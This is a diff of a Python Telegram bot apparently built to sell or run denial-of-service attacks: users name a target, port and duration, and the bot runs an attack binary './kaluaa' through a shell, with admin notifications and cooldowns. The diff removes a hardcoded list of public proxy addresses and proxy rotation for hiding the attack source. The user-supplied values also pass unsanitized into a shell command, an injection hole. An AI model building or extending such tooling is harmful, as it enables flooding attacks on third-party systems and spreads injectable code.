@@ -380,67 +380,10 @@ def show_users(message):
 ongoing_attacks = []
 attack_cooldown = {}
 
-import random
-
-# Add at beginning of file with other imports
-from typing import List
-
-# Add after global variables
-PROXY_LIST: List[str] = [
-    "103.28.224.71:8080",
-    "45.79.158.235:1080",
-    "167.71.241.136:33299",
-    "51.79.144.52:8080",
-    "103.240.161.101:6666",
-    "45.76.10.229:8118",
-    "88.198.24.108:8080",
-    "51.68.189.52:3128",
-    "95.179.249.63:3128",
-    "149.28.92.11:3128",
-    # Additional proxies
-    "185.61.152.137:8080",
-    "203.23.106.192:80",
-    "51.158.68.133:8811",
-    "159.89.221.73:3128",
-    "157.230.103.189:43896",
-    "176.9.119.170:3128",
-    "178.128.243.130:80",
-    "104.248.63.49:30588",
-    "167.99.62.50:8080",
-    "138.68.60.8:8080"
-]
-
-def update_proxy() -> str:
-    return random.choice(PROXY_LIST)
-
-@bot.message_handler(commands=['proxy'])
-def show_proxy(message):
-    user_id = str(message.chat.id)
-    users = read_users()
-    
-    if user_id not in users and user_id not in admin_id:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")
-        return
-        
-    current_proxy = update_proxy()
-    response = f"""
-🌐 𝗣𝗥𝗢𝗫𝗬 𝗦𝗧𝗔𝗧𝗨𝗦
-
-✅ 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗣𝗿𝗼𝘅𝘆: {current_proxy}
-🔄 𝗔𝘂𝘁𝗼-𝗿𝗼𝘁𝗮𝘁𝗶𝗼𝗻: Enabled
-⚡️ 𝗦𝘁𝗮𝘁𝘂𝘀: Active
-
-📝 𝗡𝗼𝘁𝗲: Proxy automatically updates with each attack
-"""
-    bot.reply_to(message, response)
-
 def start_attack_reply(message, target, port, time):
     username = message.from_user.username if message.from_user.username else message.from_user.first_name
     user_id = message.from_user.id
     start_time = datetime.now(IST)
-
-    # Update proxy before attack
-    current_proxy = update_proxy()
     
     # Add attack to ongoing attacks list
     ongoing_attacks.append({
@@ -483,8 +426,8 @@ def start_attack_reply(message, target, port, time):
         bot.send_message(admin, admin_notification)
     
     try:
-        # Execute attack with proxy
-        subprocess.run(f"./kaluaa {target} {port} {time} -x {current_proxy}", shell=True)
+        # Execute attack
+        subprocess.run(f"./kaluaa {target} {port} {time}", shell=True)
         
         # Calculate attack duration
         end_time = datetime.now(IST)
@@ -493,14 +436,13 @@ def start_attack_reply(message, target, port, time):
         # Remove from ongoing attacks
         ongoing_attacks.pop()
         
-        # Send completion message
+        # Send completion message to user
         completion_msg = f"""
 ✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗
 
 ⏱️ 𝗔𝗰𝘁𝘂𝗮𝗹 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {int(duration)} seconds
 📅 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱: {end_time.strftime('%H:%M:%S')} IST
 """
-        bot.reply_to(message, completion_msg)
         bot.reply_to(message, completion_msg)
         
         # Send completion notification to admin
